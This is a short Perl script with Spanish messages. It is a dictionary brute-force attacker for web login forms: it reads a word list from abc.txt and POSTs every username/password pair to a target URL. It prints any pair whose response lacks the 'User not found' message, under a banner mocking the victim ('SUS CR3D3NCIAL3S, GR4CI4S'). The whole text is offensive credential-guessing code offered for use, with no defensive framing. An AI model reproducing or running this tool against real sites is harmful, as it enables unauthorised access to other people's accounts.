use LWP::UserAgent;
use strict;
if ($#ARGV < 0) {
	print "args\n";
	exit();
}
my $url = @ARGS[0];
open (FILE,"abc.txt") || die "Imposible abrir el diccionario: $!";
my @abc = <FILE> ;
my $ua = new LWP::UserAgent;
my $req = new HTTP::Request 'POST',$url;

print "\n\n\n";
print "            __^__                              __^__\n";
print "           ( ___ )----------------------------( ___ )\n";
print "            |   |                              |   |\n";
print "            |   | SUS CR3D3NCIAL3S, GR4CI4S... |   |\n";
print "            |___|                              |___|\n";
print "           (_____)----------------------------(_____)\n\n";

foreach(@abc) {
	my $user = $_ ;
	chomp($user) ;
	foreach(@abc) {
		my $pass = $_ ;
		chomp($pass) ;
		$req->content_type('application/x-www-form-urlencoded');
		$req->content("usuario=$user&password=$pass");
		my $res = $ua->request($req);
		my $result = $res->as_string;
		if($result !~ /<li>User not found<\/li>/) {		
			print "USER: $user\nPASSWORD: $pass\n\n" ;		
		}
	}
}
